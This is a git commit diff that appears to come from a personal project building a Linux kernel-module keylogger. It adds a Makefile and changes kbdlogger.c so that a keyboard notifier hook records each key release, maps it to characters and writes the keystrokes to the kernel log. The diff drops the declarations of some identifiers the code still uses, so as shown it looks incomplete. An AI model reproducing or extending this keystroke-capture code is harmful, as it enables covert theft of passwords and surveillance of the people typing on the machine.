61a5be0f04da023f1ae0b6fbc5141ad3e71fa5d3
William Speirs <bill.speirs@gmail.com>
2016-02-19 17:50:28 -0500

    Got basic logging working

---
+++ Makefile
@@ -0,0 +1,8 @@
+obj-m += mymodule.o
+mymodule-objs := kbdlogger.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
--- kbdlogger.c
+++ kbdlogger.c
@@ -5,19 +5,48 @@
 #include <linux/keyboard.h>
 #include <linux/semaphore.h>
 
-#include "private.h"
-
 MODULE_LICENSE("GPL");
+
+// Taken from: https://github.com/enaudon/abide/
+char *ascii[128] = {
+  NO_EFCT, "<SOH>", "<STX>", "<ETX>", "<EOT>", "<ENQ>", "<ACK>", "<BEL>",
+  "<BS>",  "<TAB>", "<LF>",  "<VT>",  "<FF>",  "<CR>",  "<SO>",  "<SI>",
+  "<DLE>", "<DC1>", "<DC2>", "<DC3>", "<DC4>", "<NAK>", "<SYN>", "<ETB>",
+  "<CAN>", "<EM>",  "<SUB>", "<ESC>", "<FS>",  "<GS>",  "<RS>",  "<US>",
+  " ","!","\"","#","$","%","&","'","(",")","*","+",",", "-",".","/",
+  "0","1","2", "3","4","5","6","7","8","9",":",";","<", "=",">","?",
+  "@","A","B", "C","D","E","F","G","H","I","J","K","L", "M","N","O",
+  "P","Q","R", "S","T","U","V","W","X","Y","Z","[","\\","]","^","_",
+  "`","a","b", "c","d","e","f","g","h","i","j","k","l", "m","n","o",
+  "p","q","r", "s","t","u","v","w","x","y","z","{","|", "}","~","<DEL>"    
+};
 
 
 int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
-    char *buff[BUFLEN];
-    
-    // translate into a chracter
-    xlate_keysym(param, buff);
+    unsigned char type = param->value >> 8;
+    unsigned char val  = param->value & 0x00ff;
 
-    printk(KERN_INFO "%s", buff);
+    // we only catch keys on the way up
+    if(param->down)
+        return NOTIFY_OK;
+
+    // check for back space or delete first, then letters & numbers
+    if(param->value == 0xf07f) {
+        strlcpy(buff, "[BS]", BUFLEN);
+    } else if(param->value == 0xf116) {
+        strlcpy(buff, "[DEL]", BUFLEN);
+    } else if(type == 0xfb || type == 0xf0) {
+        strlcpy(buff, ascii[val], BUFLEN);
+    } 
+        
+//     printk(KERN_INFO "0x%08x 0x%08x 0x%08x\n", param->value, param->shift, param->ledstate);
+
+    // see if we got any translation, if not return
+    if(buff[0] == '\0' || buff[0] == '<')
+        return NOTIFY_OK;
+
+    printk(KERN_INFO "%s\n", buff);
 
     return NOTIFY_OK;
 }
